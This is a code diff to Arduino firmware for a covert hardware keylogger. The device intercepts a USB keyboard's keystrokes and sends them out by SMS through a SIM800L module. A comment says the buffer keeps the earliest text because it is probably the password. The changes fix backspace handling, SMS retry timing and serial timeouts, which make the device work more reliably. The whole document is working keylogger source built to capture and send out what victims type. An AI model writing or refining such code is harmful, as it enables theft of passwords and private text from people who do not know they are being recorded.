@@ -21,6 +21,8 @@ SoftwareSerial SMSSERIAL(8, 9);
 
 unsigned long previousMillis = 0;
 unsigned long previousMillisBeacon = 0;
+unsigned long previousFailSMSMillis = 0;
+
 
 #ifdef DEBUG
   unsigned long interval = 3000;
@@ -33,16 +35,20 @@ String buffer_keystrokes = "";
 unsigned int pendingLength = 0;
 
 void setup(){
-  delay(300);                                              
+  delay(3000);                                              
   Serial.begin(BAUD_RATE_SERIAL);
 
   Keyboard.begin();
-
+  
 #ifndef DEBUGWITHOUTSIM
   SMSSERIAL.begin(BAUD_RATE_SIM800L);
   USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
   SMSSERIAL.println(F("AT"));
   readResponse();
+
+  // This is needed to prevent the keylogger to hang out when sending a SMS since the default timeout is 1 sec
+  Serial.setTimeout(100);
+  SMSSERIAL.setTimeout(100);
 
   // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
   SMSSERIAL.println(F("AT+CMGF=1"));
@@ -55,7 +61,7 @@ void setup(){
 #endif //DEBUGWITHOUTSIM                                        
 }
 
-void loop(){  
+void loop(){
   unsigned long currentMillis = millis();
   captured_key = USBhost.GetKey();    
 
@@ -75,14 +81,14 @@ void loop(){
   if(captured_key){
     if(captured_key == 8){ // Backspace
       if(buffer_keystrokes.length() > 0){
-        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 2);
+        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
       }
     }
-    else{
+    else if(captured_key >= 32){ // Ignore not printable characters
       // Arduino doesn't have a lot of memory, so we need to define a max size for the buffer
       // if more characters arrive after the buffer if full it discards them (we prioritize older 
       /// text because prob the first thing typed is the password) 
-      if (buffer_keystrokes.length() < MAX_BUFFER_SIZE)
+      if (buffer_keystrokes.length() <  MAX_BUFFER_SIZE)
         buffer_keystrokes += (char)captured_key;
     }
     previousMillis = currentMillis;  
@@ -90,27 +96,30 @@ void loop(){
 
   //SMS send
   if (buffer_keystrokes.length() >= SMS_CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
-    if (!pendingSMS){
-      // The buffer could hold a lot of characters from previous SMS that couldn't be sent
-      String bufferToSend = "";
-      if (buffer_keystrokes.length() < SMS_CHAR_LIMIT - 1){
-        bufferToSend = buffer_keystrokes;
-      }
+    if(currentMillis - previousFailSMSMillis >  10000){ // delay 10 seconds between trying sending SMS if it failed
+      if (!pendingSMS){
+        // The buffer could hold a lot of characters from previous SMS that couldn't be sent
+        String bufferToSend = "";
+        if (buffer_keystrokes.length() < SMS_CHAR_LIMIT - 1){
+          bufferToSend = buffer_keystrokes;
+        }
+        else{
+          bufferToSend = buffer_keystrokes.substring(0, SMS_CHAR_LIMIT - 1);
+        }
+  #ifdef DEBUG
+        Serial.print(F("Trying to send message with content: "));
+        Serial.println(bufferToSend);
+  #endif
+        
+        sendSMSMessage(bufferToSend);
+        pendingSMS = true;
+        pendingLength = bufferToSend.length();
+      } 
       else{
-        bufferToSend = buffer_keystrokes.substring(0, SMS_CHAR_LIMIT - 1);
+  #ifdef DEBUG
+        Serial.println(F("There is a SMS pending to be sent..."));
+  #endif
       }
-#ifdef DEBUG
-      Serial.println(F("Trying to send message with content: ") + bufferToSend);
-#endif
-      
-      sendSMSMessage(bufferToSend);
-      pendingSMS = true;
-      pendingLength = bufferToSend.length();
-    } 
-    else{
-#ifdef DEBUG
-      Serial.println(F("There is a SMS pending to be sent..."));
-#endif
     }
   }
 
@@ -119,27 +128,27 @@ void loop(){
     if (SMSSERIAL.available()){
       String res = SMSSERIAL.readString();
 #ifdef DEBUG
-      Serial.println(F("Message read from SMSSERIAL: ") + res);
+      Serial.print(F("Message read from SMSSERIAL: "));
+      Serial.println(res);
 #endif
       if (res.indexOf(F("CMGS: ")) > 0){
 #ifdef DEBUG
         Serial.println(F("SMS message succesfully sent"));
 #endif
-        pendingSMS = false;
-        
+         
         SMSSerialFlush(); // just is case there is something else in the serial
         
         // We removed from the buffer the characters that were sent
         buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
       }
-      // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
-      else if (res.indexOf(F("ERROR: "))){
-        // The SMS couldn't be sent, we need to retry
+      else if (res.indexOf(F("ERROR: "))){ // The SMS couldn't be sent, we need to retry        
 #ifdef DEBUG
-        Serial.println(F("Trying to send message with content: ") + buffer_keystrokes.substring(0, pendingLength));
+        Serial.print(F("ERROR trying to send message with content: "));
+        Serial.println(buffer_keystrokes.substring(0, pendingLength));
 #endif
-        sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
+        previousFailSMSMillis = currentMillis;
       }
+      pendingSMS = false;
     }
   }
 
@@ -179,7 +188,8 @@ void loop(){
   
 #ifdef DEBUG
       if(payload.length() > 0){
-        Serial.println(F("Got payload: ") + payload);
+        Serial.print(F("Got payload: "));
+        Serial.println(payload);
       }
 #endif
       
